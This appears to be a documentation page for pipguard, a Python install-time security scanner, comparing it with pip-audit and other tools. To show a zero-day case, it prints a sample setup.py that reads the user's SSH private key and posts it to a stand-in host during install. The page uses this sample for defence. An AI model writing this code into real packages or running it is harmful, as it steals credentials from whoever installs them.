# pipguard vs. other tools

The most common question about pipguard is *"how is this different from
pip-audit?"* Short answer: they answer **different questions**, and pipguard is
a **superset** — it does what pip-audit does *and* catches attacks pip-audit
cannot see by design.

## The one-paragraph version

pip-audit (and Safety) answer **"do my pinned versions have a _published_
advisory?"** — a database lookup. That's essential, but it's **reactive**: a
brand-new malicious package has no advisory yet, so it sails straight through.
pipguard answers **"does this package's _code_ actually _do_ something a `pip
install` should never do?"** — reading `~/.ssh`, phoning home from `setup.py`,
running a shell at install time. That's **proactive** and catches **zero-days**.
And pipguard *also* runs the known-CVE check (via OSV, the same data pip-audit
uses) with `--check-vulns`.

## The evidence

A package whose `setup.py` steals your SSH key during install — the
[litellm](https://shenxianpeng.github.io/pipguard/how-it-works/)-class attack:

```python
# evilpkg/setup.py
import os, urllib.request
key = open(os.path.expanduser("~/.ssh/id_rsa")).read()
urllib.request.urlopen("https://evil.example/collect", data=key.encode())
```

```console
$ pip-audit ./evilpkg
No known vulnerabilities found
# pip-audit ran successfully — and is blind to the credential theft above.
# It audits dependency *versions* against a CVE database; it never inspects
# what the code does.

$ pipguard install ./evilpkg
[CRITICAL] evilpkg
    setup.py: Outbound network call (urllib.request.urlopen()) in install hook
❌ Installation BLOCKED — CRITICAL risk detected.
```

That "No known vulnerabilities found" is the whole point: the CVE-database model
is **reactive**, and there is no advisory for an attack the world hasn't seen yet.

Conversely, pip-audit is great at what it does — for a **published** CVE it's
authoritative:

```console
$ pip-audit -r requirements.txt
Found 3 known vulnerabilities in 1 package
requests 2.31.0  PYSEC-2026-1873  2.32.0
...
```

pipguard covers that same ground with `pipguard install --check-vulns` /
`--fail-on-vuln` (both query OSV). So you don't give anything up.

## Capability matrix

| Capability | pipguard | pip-audit / Safety | GuardDog | Socket.dev |
|---|:---:|:---:|:---:|:---:|
| Known CVE / advisory lookup | ✅ (`--check-vulns`) | ✅ | ➖ | ✅ |
| **Behavioral scan of package code (zero-day)** | ✅ | ❌ | ✅ | ✅ |
| Blocks **before** install (pre-download gate) | ✅ | ❌ | ➖ | ➖ |
| `.pth` autorun / install-hook attack detection | ✅ | ❌ | ✅ | ✅ |
| Runs fully offline by default | ✅ | ❌ | ✅ | ❌ |
| Zero third-party dependencies (pure stdlib) | ✅ | ❌ | ❌ | ❌ (SaaS) |
| Self-hostable / no account or API key | ✅ | ✅ | ✅ | ❌ |
| CI gate + pre-commit + scheduled feed watch | ✅ | ➖ | ➖ | ✅ |
| Reproducible detection benchmark (TPR/FPR in CI) | ✅ | n/a | ➖ | ❌ |

✅ yes · ➖ partial/via other means · ❌ no. (Best-effort as of writing; corrections welcome via an issue.)

## When to use which

- **Use pipguard** as the gate on `pip install` and in CI — it stops the
  install-time attacks signature tools miss, and folds in the CVE check.
- **pip-audit / Safety** remain great for auditing an *already-installed*
  environment against the advisory DB; pipguard's `--check-vulns` overlaps this.
- **GuardDog** (Datadog) is the closest peer — also behavioral. pipguard's
  differences: pure-stdlib/zero-dep, an install *gate* (not just a scanner), the
  reporter feed-watch workflow, and a CI-enforced TPR/FPR benchmark.
- **Socket.dev** is a strong commercial SaaS; pipguard is the self-hosted,
  offline-by-default, no-account alternative.

## Reproduce it yourself

Don't take our word for it — the head-to-head above is a script:

```bash
python benchmark/compare_pip_audit.py
```

It builds the malicious sample, shows pip-audit cannot scan it, and shows
pipguard flagging it CRITICAL. See also the [detection benchmark](https://github.com/shenxianpeng/pipguard/tree/main/benchmark)
(TPR/FPR, enforced in CI).
